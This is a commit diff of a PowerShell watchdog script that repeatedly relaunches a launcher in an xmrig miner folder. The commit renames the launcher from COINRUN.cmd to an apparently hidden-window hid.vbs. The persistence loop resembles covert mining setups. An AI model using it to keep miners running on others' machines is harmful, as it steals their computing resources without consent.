752676f9b1fc704d53520669734fa1a752ba492e
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-29 18:35:22 +0700

    ring.ps1

--- ring.ps1
+++ ring.ps1
@@ -1,18 +1,18 @@
-$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
+$hidVbsPath = "C:\Users\Public\Downloads\xmrig-6.22.2\hid.vbs"
 
-function Start-CoinRun {
-  $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru  # Removed -NoNewWindow
-  Write-Host "coinrun.cmd START"
+function Start-HidVbs {
+  $global:hidVbsProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$hidVbsPath`"" -PassThru  # Removed -NoNewWindow
+  Write-Host "hid.vbs START"
 }
 
-Start-CoinRun # Start the process initially
+Start-HidVbs # Start the process initially
 
 while ($true) {
-  if ($global:coinRunProcess.HasExited) {
-    Write-Warning "coinrun.cmd STOP. Reboot..."
-    Start-CoinRun # Restart the process
+  if ($global:hidVbsProcess.HasExited) {
+    Write-Warning "hid.vbs STOP. Reboot..."
+    Start-HidVbs # Restart the process
   } else {
-    Write-Host "coinrun.cmd running..."
+    Write-Host "hid.vbs running..."
   }
 
   Start-Sleep -Seconds 10
